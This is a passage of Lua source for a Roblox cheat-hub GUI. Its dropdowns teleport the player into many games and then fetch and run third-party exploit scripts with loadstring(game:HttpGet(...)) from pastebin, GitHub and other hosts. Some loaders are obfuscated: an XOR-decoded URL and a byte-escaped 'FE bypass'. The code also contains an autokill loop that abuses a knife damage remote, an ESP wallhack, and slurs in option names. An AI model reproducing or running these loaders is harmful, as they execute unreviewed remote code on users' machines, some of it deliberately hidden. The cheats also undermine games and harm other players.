        elseif Value == "Rise HUB" then
            loadstring(game:HttpGet("https://paste.gg/p/anonymous/7952a9c0447b435bbaf9b74327929ab1/files/008684bf6a8c4610bf3d62dc9c53b14c/raw"))()
        elseif Value == "CC Project HUB" then
            loadstring(game:HttpGet("https://paste.gg/p/anonymous/7952a9c0447b435bbaf9b74327929ab1/files/008684bf6a8c4610bf3d62dc9c53b14c/raw"))()
        elseif Value == "Sanky HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sdfesdfsedf/srgtergasdfs/main/aaa", true))()
        elseif Value == "Rubywtf HUB" then
            loadstring(game:HttpGet("https://rentry.co/5z44a2t7/raw", true))()
        elseif Value == "Rayx HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
        elseif Value == "Vortex HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ImagineProUser/vortexdahood/main/vortex", true))()
        elseif Value == "Azure V4 HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/UnknownScript/main/AzureV4Test.lua"))()
        elseif Value == "Polakya HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/pixelheadx/Polakya/main/Bestscript.md"))()
        elseif Value == "TBO HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/cool5013/TBO/main/TBOscript'))()
        end
    end
})

GameHubTab:AddDropdown({
	Name = "Doors",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"FFJ HUB",
		"Doors HUB",
		"Blacking HUB",
		"Zygarde HUB",
		"Chiba HUB",
		"YOU HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(6516141723, game.Players.LocalPlayer)
		elseif Value == "FFJ HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
		elseif Value == "Doors HUB" then
			loadstring(game:HttpGet(('https://pastebin.com/raw/9QPGnLx6'),true))()
		elseif Value == "Blacking HUB" then
			loadstring(game:HttpGetAsync("https://pastebin.com/raw/R8QMbhzv"))()
		elseif Value == "Zygarde HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
		elseif Value == "Chiba HUB" then
			loadstring(game:HttpGet(("https://raw.githubusercontent.com/KindIhave/ChibaHubcomeback/main/Chiba-Doors.txt"),true))()
		elseif Value == "YOU HUB" then
			local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=2 -1 , #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + (2 -1) )),v1(v2(v9,(1 -0) + (v11% #v9) ,(2 -1) + (v11% #v9) + 1 )))%(875 -(555 + 64)) ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\248\42\234\191\138\45\210\209\210\53\242\244\254\49\228\235\238\7\169\159\232\49\227\240\148\28\233\174\239\11\211\250\239","\126\177\163\187\69\134\219\167")))();
		end
	end
})

local Section = GameHubTab:AddSection({
	Name = "Driving Empire"
})

GameHubTab:AddDropdown({
	Name = "Driving Empire",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Auto Farm",
		"MAX HUB",
		"Lightux HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(3351674303, game.Players.LocalPlayer)
		elseif Value == "Auto Farm" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/drivingempire", true))()
		elseif Value == "MAX HUB" then
			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3f4c258405c294983a9b0e113dad3de7.lua"))()
		elseif Value == "Lightux HUB" then
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md'),true))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Drive World",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Max HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(10704789056, game.Players.LocalPlayer)
		elseif Value == "Max HUB" then
			local JMaxeyy = loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3f4c258405c294983a9b0e113dad3de7.lua"))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Evade",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"zReal-King HUB",
		"9Strew HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(9872472334, game.Players.LocalPlayer)
		elseif Value == "zReal-King HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Evade/main/Main.lua'))()
		elseif Value == "9Strew HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/9Strew/roblox/main/gamescripts/evade.lua'))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Funky Friday",
	Options = {
	  "None",
		"Click to Join Funky Friday",
		"Junior Scripts (BEST)",
		"AutoPlay (by Fsploit)",
		"Best AutoPlayer",
		"AutoPlayer Mobile"
	},
	Callback = function(option)
		if option == "None" then
		  print("")
		elseif option == "Click to Join Funky Friday" then
			game:GetService("TeleportService"):Teleport(6447798030, game.Players.LocalPlayer)
		elseif option == "Junior Scripts (BEST)" then
			loadstring(game:HttpGet('https://pastebin.com/raw/dcyuEgyK'))()
		elseif option == "AutoPlay (by Fsploit)" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Funkyfriday-new/main/How-to-funky-friday-script-new", true))()
		elseif option == "Best AutoPlayer" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/Funky%20Friday/BotPlayer.lua"))()
		elseif option == "AutoPlayer Mobile" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/RandomScript/main/FunkyFridayMobile"))()
		end
	end    
})

GameHubTab:AddDropdown({
	Name = "Fling things and People",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Bliz (Has key)"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(6961824067, game.Players.LocalPlayer)
		elseif Value == "Bliz (Has key)" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Frontlines",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Thunder Client lite",
		"1"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(5938036553, game.Players.LocalPlayer)
		elseif Value == "Thunder Client lite" then
			loadstring(game:HttpGet("https://scriptblox.com/raw/FRONTLINES-Thunder-Client-Lite-14265"))()
		elseif Value == "1" then
			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5bebf0b1e173f4baff73449722204837.lua"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Fights in School",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Xsama HUB",
		"Oproxide V1.1 HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(17698425045, game.Players.LocalPlayer)
		elseif Value == "Xsama HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/JayXSama/Fight-in-a-school/main/Solara"))()
		elseif Value == "Oproxide V1.1 HUB" then
			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5f56f6c554519467e5ee9d17556e34f0.lua"))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator
GameHubTab:AddDropdown({
	Name = "Godswill",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"God will"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(12826178482, game.Players.LocalPlayer)
		elseif Value == "God will" then
			loadstring(game:HttpGet("https://pastebin.com/raw/EWh2DjX4"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Gym League",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Speed X HUB",
		"RYK HUB",
		"Lightux HUB",
		"Reaper HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(17450551531, game.Players.LocalPlayer)
		elseif Value == "Speed X HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Gym%20League.lua"))()
		elseif Value == "RYK HUB" then
			loadstring(game:HttpGet("https://ryk.bloxteam.com/loader.lua"))()
		elseif Value == "Lightux HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/cool83birdcarfly02six/LightuxSolaraSup/main/README.md'))()
		elseif Value == "Reaper HUB" then
			loadstring((http.request{Url="https://reaperscripts.com/loader?l=1"}).Body, "0zek8y2bld7.qowl6c7o~1")()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Horrific Housing",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Hub"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(26263761432, game.Players.LocalPlayer)
		elseif Value == "Hub" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/HH-loader/main/HH%20loader0"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Heroes Battleground",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Heroes Battleground Script"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(13076380114, game.Players.LocalPlayer)
		elseif Value == "Heroes Battleground Script" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Faizrek/Heroes-Battlegrounds/main/Heroes%20Battlegrounds"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Hoopz",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Hoopz-Vehicles",
		"Camera - Aimbot",
		"RTrade"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(6229116934, game.Players.LocalPlayer)
		elseif Value == "Hoopz-Vehicles" then
			loadstring(game:HttpGet("https://scriptblox.com/raw/Hoopz-VEHICLES-(Basketball)-Best-Hoopz-OP-Script-2152"))()
		elseif Value == "Camera - Aimbot" then
			local Script = game:HttpGet("https://raw.githubusercontent.com/6ce/Roblox-Hoopz-Scripts/main/CameraAimbot.lua", true)
			loadstring(Script)()
		elseif Value == "RTrade" then
			local Script = game:HttpGet("https://raw.githubusercontent.com/6ce/Roblox-Hoopz-Scripts/main/CameraAimbot.lua", true)
			loadstring(Script)()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua', true))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Item Asylum",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Script 1"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(5670218884, game.Players.LocalPlayer)
		elseif Value == "Script 1" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/travislmao/pub-scripts/main/abagui", true))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Jujutsu Shenanigans",
	Default = "None",
	Options = {
		"None",
		"Click to Join Jujutsu",
		"Script 1"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join Jujutsu Shenanigans" then
			game:GetService("TeleportService"):Teleport(9391468976, game.Players.LocalPlayer)
		elseif Value == "Script 1" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Jujutsu/main/Shenanigans"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "JailBreak",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Ski HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(6068606849621, game.Players.LocalPlayer)
		elseif Value == "Ski HUB" then
			loadstring(game:HttpGet("https://pastebin.com/raw/mT10xnt7", true))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "KAT",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"1",
		"Air HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(621129760, game.Players.LocalPlayer)
		elseif Value == "1" then
			loadstring(game:HttpGet("https://pastebin.com/raw/78kG7trR", true))()
		elseif Value == "Air HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub/main/AirHub.lua"))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Launch into Space Simulator",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Junior Scripts HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(15535115259, game.Players.LocalPlayer)
		elseif Value == "Junior Scripts HUB" then
			loadstring(game:HttpGet('https://whimper.xyz/cathub.lua'))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Lumber Tycoon 2",
	Default = "None",
	Options = {
		"None",
		"Click to Join Lumber",
		"Ancestor V2 HUB",
		"Butter HUB",
		"Op Script Works in SOLARA"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(13822889, game.Players.LocalPlayer)
		elseif Value == "Ancestor V2 HUB" then
			loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/KhayneGleave/Ancestor/main/Maid.txt'))()
		elseif Value == "Butter HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua'))("")
		elseif Value == "Op Script Works in SOLARA" then
			loadstring(game:HttpGet("https://scriptblox.com/raw/Lumber-Tycoon-2-Op-script-Works-solara-14400"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Lucky Block",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Lucky BLOCK HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(662417684, game.Players.LocalPlayer)
		elseif Value == "Lucky BLOCK HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/stillnotgivingafuck/LuckyBlocks/main/loader.lua'))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "MM2",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"RogueHub (KINDA BUGGY)",
		"Amenteso [Key: mTAgLLFQJazwRWGh]",
		"MM2 ADMIN PANEL",
		"SCRIPTBLOX",
		"R3TH",
		"Snapsanix GUI",
		"Junior scripts",
		"YARMH HUB",
		"Symphony HUB",
		"Ghost HUB",
		"Nexus HUB",
		"Key: hlvipcomingsoon",
		"R3TH PRIVATE HUB",
		"Vynixu HUB",
		"Haxhell HUB",
		"Zygarde HUB",
		"Collect beachball"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(142823291, game.Players.LocalPlayer)
		elseif Value == "RogueHub (KINDA BUGGY)" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/Main.lua", true))()
		elseif Value == "Amenteso [Key: mTAgLLFQJazwRWGh]" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Amenteso/robloxscripts/main/Key.lua",true))()
		elseif Value == "MM2 ADMIN PANEL" then
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel'),true))()
		elseif Value == "SCRIPTBLOX" then
			loadstring(game:HttpGet("https://scriptblox.com/raw/Murder-Mystery-2-OP-14310"))()
		elseif Value == "R3TH" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
		elseif Value == "Snapsanix GUI" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanix-GUI-MM2/main/SnapSanix%20GUI%20mm2.lua'))()
		elseif Value == "Junior scripts" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/washingtontrichkid2/Newgay/main/MM2"))()
		elseif Value == "YARMH HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
		elseif Value == "Symphony HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
		elseif Value == "Ghost HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
		elseif Value == "Nexus HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
		elseif Value == "Key: hlvipcomingsoon" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
		elseif Value == "R3TH PRIVATE HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
		elseif Value == "Vynixu HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Neon-Fox/roblox-scripts/main/VynixuMM2"))()
		elseif Value == "Haxhell HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/haxhell/roblox-scripts/main/murder-mystery-2.lua", true))()
		elseif Value == "Zygarde HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
		elseif Value == "Collect beachball" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/summer2024", true))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Murders Vs Sheriff",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Autokill",
		"Ruby HUB",
		"Made by tanima"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(12355337193, game.Players.LocalPlayer)
		elseif Value == "Autokill | Only for Murderers" then
			-- Slash or Throw
			local way = "Throw"
			local target

			while true do
				task.wait()
				pcall(function()
					repeat
						target = game:GetService("Players"):GetPlayers()[math.random(#game:GetService("Players"):GetPlayers())]
					until target.Team == game:GetService("Teams").Sheriffs
					if target.Character:FindFirstChild("Head") then
						if target.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
							game:GetService("Players").LocalPlayer.Character.Knife.Damage:FireServer(target.Character.UpperTorso, way)
						else
							game:GetService("Players").LocalPlayer.Character.Knife.Damage:FireServer(target.Character.HumanoidRootPart, way)
						end
					end
				end)
			end
		elseif Value == "Ruby | HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Deni210/murdersvssherrifsduels/main/rubyhub", true))()
		elseif Value == "Made by tanima" then
			loadstring(game:HttpGet("https://shz.al/~madebytanima"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Murderer Vs Sheriff Duels",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Tbao HUB",
		"Ruby HUB",
		"MVSD HUB",
		"Pitbull HUB",
		"Nigg HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(12355337193, game.Players.LocalPlayer)
		elseif Value == "Tbao HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubMurdervssheriff"))()
		elseif Value == "Ruby HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Deni210/murdersvssherrifsduels/main/rubyhub", true))()
		elseif Value == "MVSD HUB" then
			loadstring(game:HttpGet("https://pastebin.com/raw/qBQE4hN0"))()
		elseif Value == "Pitbull HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/PitbullHub/main/Scripting", true))()
		elseif Value == "Nigg HUB" then
			loadstring(game:HttpGet("https://shz.al/~wetvwat"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Mic UP",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Ghost HUB",
		"Scriptblox",
		"Kitty"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(6884319169, game.Players.LocalPlayer)
		elseif Value == "Ghost HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
		elseif Value == "Scriptblox" then
			loadstring(game:HttpGet("https://scriptblox.com/raw/3008-2.73-teleport-to-player-worker-esp-grab-food-no-fall-damage-12949"))()
		elseif Value == "Kitty" then
			loadstring(game:HttpGet('https://whimper.xyz/kitty'))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Muscle Legends",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Script 1",
		"Script 2"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(3623096087, game.Players.LocalPlayer)
		elseif Value == "Script 1" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/littlegui/main/MuscleLegends"))()
		elseif Value == "Script 2" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/Roblox-Script/main/Muscle%20Legend"))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Natural Disaster",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"CH HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(189707, game.Players.LocalPlayer)
		elseif Value == "CH HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Phantom Forces",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Homohack HUB",
		"ski HUB",
		"Delete Mob",
		"ESP",
		"1"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(292439477, game.Players.LocalPlayer)
		elseif Value == "1" then
			loadstring(game:HttpGet('https://pastebin.com/raw/R8QMbhzv'))()
		elseif Value == "Homohack HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/homohack.lua"))()
		elseif Value == "ESP" then
			print("ESP PF Initialized.")
			local enemyteam = game.Workspace.Players:GetChildren()[1]
			local friendlyteam = game.Workspace.Players:GetChildren()[2]
			while wait(0.1) do
				for _,v in enemyteam:GetDescendants() do
					if v.ClassName == "Model" and not v:FindFirstChild("Highlight") then
						local h = Instance.new("Highlight", v)
						h.FillColor = Color3.new(1, 0, 0)
						h.FillTransparency = 0.4
						print(string.format("Highlighted %s", v.Name))
					end
				end
				for _,v in friendlyteam:GetDescendants() do
					if v.ClassName == "Model" and not v:FindFirstChild("Highlight") then
						local h = Instance.new("Highlight", v)
						h.FillColor = Color3.new(0.227451, 1, 0.054902)
						h.FillTransparency = 0.8
						print(string.format("Highlighted %s", v.Name))
					end
				end
			end
		elseif Value == "Delete Mob" then
			loadstring(game:HttpGet("https://pastebin.com/raw/QaK6BeWq"))()
		elseif Value == "ski HUB" then
			loadstring(game:HttpGet("https://pastebin.com/raw/mT10xnt7"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Options",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"HUB",
		"Lenut HUB",
		"PyroX HUB",
		"REDz HUB",
		"Speed X HUB",
		"Zap HUB",
		"Aqua Flow X",
		"1"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(8737899170, game.Players.LocalPlayer)
		elseif Value == "Aqua Flow X" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/HGIOD/AquaFlowX/main/FlowX'))()
		elseif Value == "1" then
			loadstring(game:HttpGet("https://pastebin.com/raw/DuRQxvGt"))()
		elseif Value == "HUB" then
			loadstring(game:HttpGet("https://pastebin.com/raw/P5BmBjs0"))()
		elseif Value == "PyroX HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/PyroXHUB/PyroX/main/PS99'))()
		elseif Value == "REDz HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
		elseif Value == "Speed X HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/PS99.lua"))()
		elseif Value == "Zap HUB" then
			loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
		elseif Value == "Lenut HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/lenutjr/lenut/main/scripts"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Options",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Claws",
		"Elerium",
		"Pro"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(5956785391, game.Players.LocalPlayer)
		elseif Value == "Claws" then
			loadstring(game:HttpGet("https://pastebin.com/raw/tBUWGPU3"))()
		elseif Value == "Elerium" then
			loadstring(game:HttpGet("https://pastebin.com/raw/Dbt5rHdD"))()
		elseif Value == "Pro" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/Scripts2024/main/newprojslayrs"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Options",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Admin HUB",
		"Fe HUB",
		"Prison WARE",
		"REMASTERED",
		"Tiger Admin MENU (Press ; To open the menu)"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(5956785391, game.Players.LocalPlayer)
		elseif Value == "Admin HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/Roblox-scripts/main/Prision%20Admin%20Hub%20irufwjskwidiuxejw8uddjjwjdnnwjwjdbb"))()
		elseif Value == "Fe HUB" then
			loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
		elseif Value == "Prison WARE" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
		elseif Value == "REMASTERED" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/56-Clubs-Prison-Life-REMASTERED-SCRIPT/main/Main", true))()
		elseif Value == "Tiger Admin MENU (Press ; To open the menu)" then
			loadstring(game:HttpGet("https://pastebin.com/raw/JNpnKFNs"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Options",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"(BEST ONE) Junior SCRIPTS"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(8737602449, game.Players.LocalPlayer)
		elseif Value == "(BEST ONE) Junior SCRIPTS" then
			loadstring(game:HttpGet("https://pastebin.com/raw/CHFh3mhH"))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Options",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Drowned HUB",
		"Jonny HUB",
		"LB HUB",
		"Phantom HUB",
		"RV HUB",
		"Rinns HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(17625359962, game.Players.LocalPlayer)
		elseif Value == "Drowned HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/malfume/Drowned/main/DrownedHub"))()
		elseif Value == "Jonny HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/JonnyCheeser/rivals/main/rival"))()
